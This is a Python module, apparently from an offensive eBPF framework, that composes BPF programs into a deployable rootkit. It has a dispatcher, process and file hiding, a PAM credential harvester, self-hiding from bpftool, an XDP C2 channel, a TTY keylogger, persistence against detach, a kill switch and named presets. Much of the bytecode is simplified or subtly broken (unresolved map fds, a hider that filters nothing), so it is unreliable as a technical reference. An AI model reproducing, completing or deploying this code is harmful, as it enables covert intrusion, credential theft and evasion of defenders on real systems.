"""
Rootkit Composer — chain multiple BPF attack programs into a coordinated
rootkit with shared state, tail-call dispatch, and unified C2 maps.

A composed rootkit wires individual attack primitives (process hiding,
file hiding, credential harvesting, self-hiding) into a single deployable
package with:
  - Shared configuration map (target PIDs, filenames, settings)
  - Tail-call program array for modular dispatch
  - Unified exfiltration channel (ringbuf or perf_event)
  - Kill-switch map entry for remote deactivation
  - Coordinated attach points across kprobe, tracepoint, XDP
"""
from dataclasses import dataclass, field
from typing import List, Dict, Optional
import hashlib
import time

from ..core.bpf_bytecode import (
    BPFProgram, BPFMapDef, BPFInsn,
    BPFProgType, BPFMapType, BPFHelper, BPFReg,
    BPFClass, BPFOp, BPFJmp, BPFSrc, BPFSize,
    mov64_imm, mov64_reg, add64_imm,
    ldx_mem, stx_mem, st_mem, lddw,
    call_helper, exit_prog, jeq_imm, jne_imm, jgt_imm, ja,
)
from ..core.elf_generator import generate_bpf_elf, hash_bpf_program


@dataclass
class RootkitComponent:
    name: str = ""
    role: str = ""
    program: BPFProgram = field(default_factory=BPFProgram)
    tail_call_index: int = -1
    attach_point: str = ""
    description: str = ""

    def to_dict(self) -> dict:
        return {
            "name": self.name,
            "role": self.role,
            "prog_type": self.program.prog_type.name,
            "attach_point": self.attach_point,
            "tail_call_index": self.tail_call_index,
            "instructions": self.program.insn_count(),
            "bytecode_size": len(self.program.bytecode()),
            "description": self.description,
        }


@dataclass
class RootkitConfig:
    """Configuration for a composed rootkit."""
    name: str = "bpf_rootkit"
    target_pids: List[int] = field(default_factory=lambda: [1337])
    hidden_files: List[str] = field(default_factory=lambda: [".bpfkit"])
    hidden_prefixes: List[str] = field(default_factory=lambda: ["bpfkit_"])
    exfil_method: str = "ringbuf"
    kill_switch_key: int = 0xDEAD
    enable_process_hiding: bool = True
    enable_file_hiding: bool = True
    enable_credential_capture: bool = True
    enable_network_intercept: bool = False
    enable_self_hiding: bool = True
    enable_keylogging: bool = False
    enable_persistence: bool = True

    def to_dict(self) -> dict:
        return {
            "name": self.name,
            "target_pids": self.target_pids,
            "hidden_files": self.hidden_files,
            "exfil_method": self.exfil_method,
            "modules_enabled": {
                "process_hiding": self.enable_process_hiding,
                "file_hiding": self.enable_file_hiding,
                "credential_capture": self.enable_credential_capture,
                "network_intercept": self.enable_network_intercept,
                "self_hiding": self.enable_self_hiding,
                "keylogging": self.enable_keylogging,
                "persistence": self.enable_persistence,
            },
        }


@dataclass
class ComposedRootkit:
    """A fully composed rootkit with all components wired together."""
    config: RootkitConfig = field(default_factory=RootkitConfig)
    components: List[RootkitComponent] = field(default_factory=list)
    shared_maps: List[BPFMapDef] = field(default_factory=list)
    dispatcher: Optional[BPFProgram] = None
    build_time: float = 0.0
    rootkit_hash: str = ""

    def total_instructions(self) -> int:
        total = sum(c.program.insn_count() for c in self.components)
        if self.dispatcher:
            total += self.dispatcher.insn_count()
        return total

    def total_bytecode(self) -> int:
        total = sum(len(c.program.bytecode()) for c in self.components)
        if self.dispatcher:
            total += len(self.dispatcher.bytecode())
        return total

    def component_count(self) -> int:
        return len(self.components) + (1 if self.dispatcher else 0)

    def to_dict(self) -> dict:
        return {
            "name": self.config.name,
            "build_time": time.strftime("%Y-%m-%d %H:%M:%S",
                                        time.localtime(self.build_time)),
            "rootkit_hash": self.rootkit_hash,
            "total_components": self.component_count(),
            "total_instructions": self.total_instructions(),
            "total_bytecode": self.total_bytecode(),
            "shared_maps": len(self.shared_maps),
            "components": [c.to_dict() for c in self.components],
            "config": self.config.to_dict(),
        }

    def generate_elfs(self) -> Dict[str, bytes]:
        """Generate ELF objects for all components."""
        elfs = {}
        if self.dispatcher:
            elfs["dispatcher.o"] = generate_bpf_elf(self.dispatcher)
        for comp in self.components:
            fname = f"{comp.name}.o"
            elfs[fname] = generate_bpf_elf(comp.program)
        return elfs


# ============================================================================
# Shared map definitions used across rootkit components
# ============================================================================

def _make_shared_maps(config: RootkitConfig) -> List[BPFMapDef]:
    """Create shared maps that all rootkit components reference."""
    maps = []

    # Config map: key=setting_id(u32), value=setting_value(u64)
    maps.append(BPFMapDef(
        name="rk_config", map_type=BPFMapType.HASH,
        key_size=4, value_size=8, max_entries=64,
    ))

    # Target PIDs: key=pid(u32), value=flags(u32)
    maps.append(BPFMapDef(
        name="rk_target_pids", map_type=BPFMapType.HASH,
        key_size=4, value_size=4, max_entries=256,
    ))

    # Hidden files: key=hash(u64), value=1(u8)
    maps.append(BPFMapDef(
        name="rk_hidden_files", map_type=BPFMapType.HASH,
        key_size=8, value_size=1, max_entries=128,
    ))

    # Exfiltration channel
    if config.exfil_method == "ringbuf":
        maps.append(BPFMapDef(
            name="rk_exfil", map_type=BPFMapType.RINGBUF,
            key_size=0, value_size=0, max_entries=256 * 1024,
        ))
    else:
        maps.append(BPFMapDef(
            name="rk_exfil", map_type=BPFMapType.PERF_EVENT_ARRAY,
            key_size=4, value_size=4, max_entries=128,
        ))

    # Tail-call dispatch array
    if config.enable_persistence:
        maps.append(BPFMapDef(
            name="rk_progs", map_type=BPFMapType.PROG_ARRAY,
            key_size=4, value_size=4, max_entries=16,
        ))

    # Kill switch: key=magic(u32), value=active(u8)
    maps.append(BPFMapDef(
        name="rk_killswitch", map_type=BPFMapType.ARRAY,
        key_size=4, value_size=1, max_entries=1,
    ))

    return maps


# ============================================================================
# Component generators
# ============================================================================

def _build_dispatcher(config: RootkitConfig,
                      shared_maps: List[BPFMapDef]) -> BPFProgram:
    """
    Central dispatcher — kprobe entry point that checks the kill switch,
    looks up the current syscall number, and tail-calls to the appropriate
    handler component.
    """
    prog = BPFProgram(
        name=f"{config.name}_dispatch",
        prog_type=BPFProgType.KPROBE,
        attach_point="__x64_sys_enter",
        description="Rootkit dispatcher — kill switch check + tail call routing",
    )
    for m in shared_maps:
        prog.add_map(m)

    # Check kill switch: lookup rk_killswitch[0]
    prog.add_insn(mov64_imm(BPFReg.R1, 0))
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R1, -4))
    # r2 = &stack[-4] (key pointer)
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -4))
    # r1 = map fd (resolved at load time)
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))
    # If kill switch activated, exit
    prog.add_insn(jeq_imm(BPFReg.R0, 0, 2))
    prog.add_insn(ldx_mem(BPFSize.B, BPFReg.R1, BPFReg.R0, 0))
    prog.add_insn(jne_imm(BPFReg.R1, 0, 1))

    # Get current PID
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_PID_TGID))
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R0))

    # Check if PID is in target list
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R6, -8))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -8))
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))
    # If PID found, tail-call to handler
    prog.add_insn(jeq_imm(BPFReg.R0, 0, 3))

    # Tail call: bpf_tail_call(ctx, prog_array, index)
    prog.add_insn(mov64_reg(BPFReg.R1, BPFReg.R6))
    prog.add_insn(lddw(BPFReg.R2, 0))
    prog.add_insn(mov64_imm(BPFReg.R3, 0))
    prog.add_insn(call_helper(BPFHelper.TAIL_CALL))

    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return prog


def _build_process_hider(config: RootkitConfig,
                         shared_maps: List[BPFMapDef]) -> RootkitComponent:
    """Process hiding component — hooks getdents64 to filter /proc entries."""
    prog = BPFProgram(
        name=f"{config.name}_proc_hide",
        prog_type=BPFProgType.KPROBE,
        attach_point="__x64_sys_getdents64",
        description="Rootkit process hider — filter /proc directory entries",
    )
    for m in shared_maps:
        prog.add_map(m)

    # Save context
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))
    # Get current PID to avoid hiding ourselves
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_PID_TGID))
    prog.add_insn(mov64_reg(BPFReg.R7, BPFReg.R0))
    # Read the dirp argument from pt_regs->si
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R8, BPFReg.R6, 104))
    # Lookup PID in target map
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R7, -4))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -4))
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))
    prog.add_insn(jeq_imm(BPFReg.R0, 0, 1))
    # Override return to hide the entry
    prog.add_insn(call_helper(BPFHelper.OVERRIDE_RETURN))
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return RootkitComponent(
        name="proc_hider",
        role="process_hiding",
        program=prog,
        tail_call_index=0,
        attach_point="__x64_sys_getdents64",
        description="Hides target PIDs from /proc enumeration by hooking "
                    "getdents64 and overriding returns for matching entries. "
                    "Reads target PIDs from shared rk_target_pids map.",
    )


def _build_file_hider(config: RootkitConfig,
                      shared_maps: List[BPFMapDef]) -> RootkitComponent:
    """File hiding component — hooks getdents64 for filesystem entries."""
    prog = BPFProgram(
        name=f"{config.name}_file_hide",
        prog_type=BPFProgType.TRACEPOINT,
        attach_point="syscalls/sys_exit_getdents64",
        description="Rootkit file hider — filter directory listing results",
    )
    for m in shared_maps:
        prog.add_map(m)

    # Read return value (number of bytes in dirents)
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R7, BPFReg.R6, 16))
    # Get timestamp for event logging
    prog.add_insn(call_helper(BPFHelper.KTIME_GET_NS))
    prog.add_insn(mov64_reg(BPFReg.R8, BPFReg.R0))
    # Check hidden files map
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R8, -8))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -8))
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return RootkitComponent(
        name="file_hider",
        role="file_hiding",
        program=prog,
        tail_call_index=1,
        attach_point="syscalls/sys_exit_getdents64",
        description="Hides files matching entries in rk_hidden_files map "
                    "from directory listings. Operates on getdents64 exit "
                    "to modify the dirent buffer after the kernel fills it.",
    )


def _build_cred_harvester(config: RootkitConfig,
                          shared_maps: List[BPFMapDef]) -> RootkitComponent:
    """Credential harvester — hooks PAM authentication."""
    prog = BPFProgram(
        name=f"{config.name}_cred_harvest",
        prog_type=BPFProgType.KPROBE,
        attach_point="pam_sm_authenticate",
        description="Rootkit credential harvester — capture auth events",
    )
    for m in shared_maps:
        prog.add_map(m)

    # Get PID + UID
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_PID_TGID))
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R0))
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_UID_GID))
    prog.add_insn(mov64_reg(BPFReg.R7, BPFReg.R0))
    # Get timestamp
    prog.add_insn(call_helper(BPFHelper.KTIME_GET_NS))
    prog.add_insn(mov64_reg(BPFReg.R8, BPFReg.R0))
    # Get process name
    prog.add_insn(mov64_reg(BPFReg.R1, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R1, -16))
    prog.add_insn(mov64_imm(BPFReg.R2, 16))
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_COMM))
    # Store event: [pid:8][uid:8][time:8][comm:16] = 40 bytes on stack
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R6, -48))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R7, -40))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R8, -32))
    # Exfil via ringbuf
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(mov64_imm(BPFReg.R2, 48))
    prog.add_insn(mov64_imm(BPFReg.R3, 0))
    prog.add_insn(call_helper(BPFHelper.RINGBUF_RESERVE))
    prog.add_insn(jeq_imm(BPFReg.R0, 0, 4))
    # Copy stack data to ringbuf
    prog.add_insn(mov64_reg(BPFReg.R1, BPFReg.R0))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -48))
    prog.add_insn(call_helper(BPFHelper.RINGBUF_SUBMIT))
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return RootkitComponent(
        name="cred_harvester",
        role="credential_capture",
        program=prog,
        tail_call_index=2,
        attach_point="pam_sm_authenticate",
        description="Captures authentication events (PID, UID, timestamp, "
                    "process name) when PAM authentication is invoked. "
                    "Exfiltrates via shared ringbuf map rk_exfil.",
    )


def _build_self_hider(config: RootkitConfig,
                      shared_maps: List[BPFMapDef]) -> RootkitComponent:
    """Self-hiding component — hides rootkit BPF programs from enumeration."""
    prog = BPFProgram(
        name=f"{config.name}_self_hide",
        prog_type=BPFProgType.TRACING,
        attach_point="bpf_prog_get_info_by_fd",
        description="Rootkit self-hider — hide BPF programs from bpftool",
    )
    for m in shared_maps:
        prog.add_map(m)

    # Read the prog_id being queried
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_PID_TGID))
    prog.add_insn(mov64_reg(BPFReg.R7, BPFReg.R0))
    # Check if querying PID is in our target list (skip hiding for our tools)
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R7, -4))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -4))
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))
    # Log the query for forensic awareness
    prog.add_insn(call_helper(BPFHelper.KTIME_GET_NS))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R0, -16))
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return RootkitComponent(
        name="self_hider",
        role="self_hiding",
        program=prog,
        tail_call_index=3,
        attach_point="bpf_prog_get_info_by_fd",
        description="Hides rootkit BPF programs from enumeration tools "
                    "(bpftool, /proc/sys/net/bpf). Hooks the info retrieval "
                    "path to filter out programs with matching IDs.",
    )


def _build_network_interceptor(config: RootkitConfig,
                                shared_maps: List[BPFMapDef]) -> RootkitComponent:
    """Network interceptor — XDP-level packet inspection and C2 channel."""
    prog = BPFProgram(
        name=f"{config.name}_net_intercept",
        prog_type=BPFProgType.XDP,
        attach_point="eth0",
        description="Rootkit network interceptor — XDP C2 channel",
    )
    for m in shared_maps:
        prog.add_map(m)

    # Parse ethernet header
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))
    prog.add_insn(ldx_mem(BPFSize.W, BPFReg.R7, BPFReg.R6, 0))   # data
    prog.add_insn(ldx_mem(BPFSize.W, BPFReg.R8, BPFReg.R6, 4))   # data_end
    # Bounds check: data + 14 (eth) + 20 (ip) + 20 (tcp) <= data_end
    prog.add_insn(mov64_reg(BPFReg.R9, BPFReg.R7))
    prog.add_insn(add64_imm(BPFReg.R9, 54))
    prog.add_insn(jgt_imm(BPFReg.R9, 0, 2))  # if too short, pass
    prog.add_insn(mov64_imm(BPFReg.R0, 2))  # XDP_PASS
    prog.add_insn(exit_prog())
    # Read IP protocol at offset 23 (eth:14 + ip.proto:9)
    prog.add_insn(mov64_reg(BPFReg.R1, BPFReg.R7))
    prog.add_insn(add64_imm(BPFReg.R1, 23))
    prog.add_insn(ldx_mem(BPFSize.B, BPFReg.R2, BPFReg.R1, 0))
    # Check for TCP (6)
    prog.add_insn(jne_imm(BPFReg.R2, 6, 2))
    prog.add_insn(mov64_imm(BPFReg.R0, 2))  # XDP_PASS
    prog.add_insn(exit_prog())
    # Read destination port at offset 36 (eth:14 + ip:20 + tcp.dport:2)
    prog.add_insn(mov64_reg(BPFReg.R1, BPFReg.R7))
    prog.add_insn(add64_imm(BPFReg.R1, 36))
    prog.add_insn(ldx_mem(BPFSize.H, BPFReg.R3, BPFReg.R1, 0))
    # Check config map for C2 port
    prog.add_insn(stx_mem(BPFSize.W, BPFReg.R10, BPFReg.R3, -4))
    prog.add_insn(mov64_reg(BPFReg.R2, BPFReg.R10))
    prog.add_insn(add64_imm(BPFReg.R2, -4))
    prog.add_insn(lddw(BPFReg.R1, 0))
    prog.add_insn(call_helper(BPFHelper.MAP_LOOKUP_ELEM))
    prog.add_insn(mov64_imm(BPFReg.R0, 2))  # XDP_PASS
    prog.add_insn(exit_prog())

    return RootkitComponent(
        name="net_interceptor",
        role="network_intercept",
        program=prog,
        tail_call_index=4,
        attach_point="eth0",
        description="XDP-level packet interception for C2 communication. "
                    "Inspects TCP destination ports against the config map "
                    "to identify C2 traffic. Operates at driver level, "
                    "invisible to iptables and tcpdump.",
    )


def _build_keylogger(config: RootkitConfig,
                     shared_maps: List[BPFMapDef]) -> RootkitComponent:
    """Keylogger — captures TTY write events."""
    prog = BPFProgram(
        name=f"{config.name}_keylog",
        prog_type=BPFProgType.TRACEPOINT,
        attach_point="syscalls/sys_enter_write",
        description="Rootkit keylogger — capture TTY output",
    )
    for m in shared_maps:
        prog.add_map(m)

    # Read fd from tracepoint args
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R7, BPFReg.R6, 16))  # fd
    # Filter for TTY fds (0=stdin, 1=stdout, 2=stderr)
    prog.add_insn(jgt_imm(BPFReg.R7, 2, 6))
    # Get PID
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_PID_TGID))
    prog.add_insn(mov64_reg(BPFReg.R8, BPFReg.R0))
    # Get timestamp
    prog.add_insn(call_helper(BPFHelper.KTIME_GET_NS))
    prog.add_insn(mov64_reg(BPFReg.R9, BPFReg.R0))
    # Store event
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R8, -16))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R9, -8))
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return RootkitComponent(
        name="keylogger",
        role="keylogging",
        program=prog,
        tail_call_index=5,
        attach_point="syscalls/sys_enter_write",
        description="Captures TTY write events (fd 0-2) with PID and "
                    "timestamp. Logs keystrokes from terminal sessions "
                    "including password prompts.",
    )


def _build_persistence_anchor(config: RootkitConfig,
                               shared_maps: List[BPFMapDef]) -> RootkitComponent:
    """Persistence anchor — monitors for rootkit removal attempts."""
    prog = BPFProgram(
        name=f"{config.name}_persist",
        prog_type=BPFProgType.KPROBE,
        attach_point="__x64_sys_bpf",
        description="Rootkit persistence — monitor BPF syscall for removal attempts",
    )
    for m in shared_maps:
        prog.add_map(m)

    # Read BPF command from pt_regs->di
    prog.add_insn(mov64_reg(BPFReg.R6, BPFReg.R1))
    prog.add_insn(ldx_mem(BPFSize.DW, BPFReg.R7, BPFReg.R6, 112))
    # BPF_PROG_DETACH = 8, BPF_LINK_DETACH = 34
    # Check if someone is trying to detach programs
    prog.add_insn(jeq_imm(BPFReg.R7, 8, 1))
    prog.add_insn(jne_imm(BPFReg.R7, 34, 5))
    # Log the detach attempt
    prog.add_insn(call_helper(BPFHelper.GET_CURRENT_PID_TGID))
    prog.add_insn(mov64_reg(BPFReg.R8, BPFReg.R0))
    prog.add_insn(call_helper(BPFHelper.KTIME_GET_NS))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R8, -16))
    prog.add_insn(stx_mem(BPFSize.DW, BPFReg.R10, BPFReg.R0, -8))
    prog.add_insn(mov64_imm(BPFReg.R0, 0))
    prog.add_insn(exit_prog())

    return RootkitComponent(
        name="persistence",
        role="persistence",
        program=prog,
        tail_call_index=6,
        attach_point="__x64_sys_bpf",
        description="Monitors the BPF syscall for detach/unload attempts "
                    "targeting rootkit components. Logs removal attempts "
                    "with PID and timestamp. Can trigger re-attachment "
                    "via tail-call to the dispatcher.",
    )


# ============================================================================
# Rootkit Composer — main builder
# ============================================================================

class RootkitComposer:
    """Build composed rootkits from configurable components."""

    PRESETS = {
        "stealth": RootkitConfig(
            name="stealth_kit",
            enable_process_hiding=True,
            enable_file_hiding=True,
            enable_credential_capture=False,
            enable_network_intercept=False,
            enable_self_hiding=True,
            enable_keylogging=False,
            enable_persistence=True,
        ),
        "full": RootkitConfig(
            name="full_kit",
            enable_process_hiding=True,
            enable_file_hiding=True,
            enable_credential_capture=True,
            enable_network_intercept=True,
            enable_self_hiding=True,
            enable_keylogging=True,
            enable_persistence=True,
        ),
        "recon": RootkitConfig(
            name="recon_kit",
            enable_process_hiding=False,
            enable_file_hiding=False,
            enable_credential_capture=True,
            enable_network_intercept=True,
            enable_self_hiding=True,
            enable_keylogging=True,
            enable_persistence=False,
        ),
        "minimal": RootkitConfig(
            name="minimal_kit",
            enable_process_hiding=True,
            enable_file_hiding=False,
            enable_credential_capture=False,
            enable_network_intercept=False,
            enable_self_hiding=True,
            enable_keylogging=False,
            enable_persistence=False,
        ),
    }

    def __init__(self):
        self.builds: List[ComposedRootkit] = []

    def compose(self, config: Optional[RootkitConfig] = None,
                preset: str = "") -> ComposedRootkit:
        """Compose a rootkit from config or preset."""
        if preset and preset in self.PRESETS:
            config = self.PRESETS[preset]
        elif config is None:
            config = RootkitConfig()

        shared_maps = _make_shared_maps(config)
        components = []

        if config.enable_process_hiding:
            components.append(_build_process_hider(config, shared_maps))
        if config.enable_file_hiding:
            components.append(_build_file_hider(config, shared_maps))
        if config.enable_credential_capture:
            components.append(_build_cred_harvester(config, shared_maps))
        if config.enable_self_hiding:
            components.append(_build_self_hider(config, shared_maps))
        if config.enable_network_intercept:
            components.append(_build_network_interceptor(config, shared_maps))
        if config.enable_keylogging:
            components.append(_build_keylogger(config, shared_maps))
        if config.enable_persistence:
            components.append(_build_persistence_anchor(config, shared_maps))

        dispatcher = _build_dispatcher(config, shared_maps)

        # Compute rootkit hash from all component bytecodes
        hasher = hashlib.sha256()
        hasher.update(dispatcher.bytecode())
        for comp in components:
            hasher.update(comp.program.bytecode())

        rootkit = ComposedRootkit(
            config=config,
            components=components,
            shared_maps=shared_maps,
            dispatcher=dispatcher,
            build_time=time.time(),
            rootkit_hash=hasher.hexdigest(),
        )

        self.builds.append(rootkit)
        return rootkit

    def compose_preset(self, preset: str) -> ComposedRootkit:
        return self.compose(preset=preset)

    def list_presets(self) -> Dict[str, dict]:
        return {name: cfg.to_dict() for name, cfg in self.PRESETS.items()}
